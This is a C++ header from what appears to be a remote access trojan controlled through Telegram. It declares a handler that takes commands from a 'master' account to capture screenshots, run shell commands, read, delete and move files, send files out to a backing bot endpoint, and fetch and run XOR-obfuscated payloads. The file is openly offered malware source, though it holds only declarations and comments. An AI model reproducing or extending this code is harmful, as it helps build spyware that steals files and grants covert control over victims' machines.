/*include/rat/Handler.hpp*/
/*
 * This module is responsible for bringing everything together, it basically
 * take commandss for the bots and its client,
 * */
#pragma once
#include "rat/ThreadPool.hpp"
#include "rat/handler/types.hpp"
#include "rat/networking.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/tbot/types.hpp"

#include <array>
#include <cstdint>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

namespace rat::handler {

using ThreadPool_uPtr = std::unique_ptr<::rat::threading::ThreadPool>;
using ThreadPool_sPtr = std::shared_ptr<::rat::threading::ThreadPool>;
using BaseBot_uPtr = std::unique_ptr<::rat::tbot::BaseBot>;
using Bot_uPtr = std::unique_ptr<::rat::tbot::Bot>;
using CurlClient_uPtr = std::unique_ptr<::rat::networking::Client>;

class Handler {
  protected:
	uint32_t sleep_timeout_ms = 500;
	uint32_t empty_updates_count = 0;

  public:
	uint64_t master_id;
	Bot_uPtr bot;
	BaseBot_uPtr backing_bot;
	CurlClient_uPtr curl_client;

  private:
	ThreadPool_uPtr long_process_pool;
	ThreadPool_uPtr short_process_pool;

	std::mutex curl_client_mutex;
	std::mutex backing_bot_mutex;

	::rat::handler::RatState state;

	::rat::tbot::Update *telegram_update;
	::rat::handler::Command command;

	std::vector<std::string> written_files;

	struct CommandHandler {
		std::string command;
		void (
		    Handler::*handler)(); // a function pointer to the handler method
		                          // that actually executes the handling logic.
	};

	const std::array<CommandHandler, 24> command_map = {
	    {// resets the internal state of the handler, by destroying the object
	     // this->state and reinstantiating it.
	     {"/clean", &Handler::handleCleanCommand},
	     {"/reset", &Handler::handleResetCommand},
	     // takes a screenshot of the screen and sends, currently buggy since it
	     // does not delete the taken screenshot after upload;
	     {"/screenshot", &Handler::handleScreenshotCommand},
	     // drops the pending tasks for execution inside both the thread pools
	     // of the handler.
	     {"/drop", &Handler::handleDropCommand},
	     // executes a shell command as a seperate process entirely, with an
	     // unlimited timeout or a defined one.
	     // command_map
	     {"/menu", &Handler::handleMenuCommand},
	     // downloads file using this->client_curl client;
	     {"/download", &Handler::handleDownloadCommand},
	     // uploads a file to a url using the same client;
	     {"/upload", &Handler::handleUploadCommand},
	     // prints the current working path;
	     {"/pwd", &Handler::handlePwdCommand},
	     // changes the current path;
	     {"/cd", &Handler::handleCdCommand},
	     // lists the current path;
	     {"/ls", &Handler::handleLsCommand},
	     // reads the content of the file
	     {"/read", &Handler::handleReadCommand},
	     // creates a file
	     {"/touch", &Handler::handleTouchCommand},
	     // uploads a file to the this->backing_bot endpoint;
	     {"/get", &Handler::handleGetCommand},
	     // gives the stat of the file
	     {"/stat", &Handler::handleStatCommand},
	     // removes the file or the dir dangerous
	     {"/rm", &Handler::handleRmCommand},
	     // similaor to unix mv
	     {"/mv", &Handler::handleMvCommand},
	     {"/mkdir", &Handler::handleMkdirCommand},

	     // copies the file or the dir
	     {"/cp", &Handler::handleCpCommand},
	     // supposedly sets the option in the bot or the state
	     {"/set", &Handler::handleSetCommand},
	     // a help command;
	     {"/help", &Handler::handleHelpCommand},
	     // fetches the path of a command adds it to the static command map
	     // inside this->state, this is supposed to define dynamic commands
	     // dependent on the environnment of executes and add syntactic sugar
	     // over /process.
	     {"/fetch", &Handler::handleFetchCommand},
	     {"/run", &Handler::handleRunCommand},
	     {"/lprocess", &Handler::handleProcessCommand},
	     {"/process", &Handler::handleProcessCommand}}};

	// The commands that execute with ! has their own dispatcher.

	// Parse Telegram message to command, there is an attribute command that
	// this method writes to, all the handlers and methods mutates the state of
	// the class.
	void parseTelegramMessageToCommand(void);

	// Command handler methods
	void handleCleanCommand();
	void handleResetCommand();
	void handleScreenshotCommand();
	void handleDropCommand();
	void handleProcessCommand();
	void handleHelpCommand();
	void handleMenuCommand();
	void handleDownloadCommand();
	void handleUploadCommand();
	void handlePwdCommand();
	void handleCdCommand();
	void handleLsCommand();
	void handleReadCommand();
	void handleTouchCommand();
	void handleGetCommand();
	void handleStatCommand();
	void handleRmCommand();
	void handleMvCommand();
	void handleMkdirCommand();
	void handleCpCommand();
	void handleSetCommand();
	void handleFetchCommand();
	void handleRunCommand();
	// Dispatchers - direct member function calls
	void dispatchIntegratedCommand();

	void dispatchDynamicCommand();

	void handleMessageWithUploadedFiles();
	// Its helpers
	inline std::vector<std::filesystem::path>
	downloadMultipleFiles(::rat::tbot::BaseBot *Tbot_Bot,
	                      const std::vector<::rat::tbot::File> &Tbot_Files);

	inline void handlePayload(::rat::tbot::Message &Tbot_Message,
	                          const std::filesystem::path &Payload_Path);

	inline void handleXoredPayload(::rat::tbot::Message &Tbot_Message);
	void handlePayloadCommand(void);
	void _dynamicSleep();

  public:
	explicit Handler() {
		this->state = {};
		this->telegram_update = nullptr;
		this->command = {};
		this->written_files.reserve(10);
	};

	~Handler() {
		for(const auto& written_file : this->written_files) {
			std::filesystem::remove(written_file);
		}
	};
	Handler &setMasterId(uint64_t Master_Id);
	Handler &initMainBot(const char *arg_Token);
	Handler &initBackingBot(const char *arg_Token);
	Handler &initCurlClient(uint8_t Operation_Restart_Bound = 5);
	Handler &initThreadPools(uint8_t Number_Long_Process_Threads = 1,
	                         uint8_t Number_Short_Process_Threads = 2,
	                         uint8_t Number_Helper_Threads = 2);
	// Handle Telegram update

	void handleUpdates();
	::rat::networking::NetworkingResult
	downloadXoredPayload(const std::string &File_Url);

}; // class rat::handler::Handler

void __normalizeWhiteSpaces(std::string &String_Input);

size_t __countWhiteSpaces(const std::string &String_Input);

size_t __findFirstOccurenceOfChar(const std::string &Input_String, char arg_C);

uint16_t _stringToUint16(const std::string &str);

std::vector<std::string> splitArguments(const std::string &Input_String);

std::string stripQuotes(const std::string &Input_String);

} // namespace rat::handler
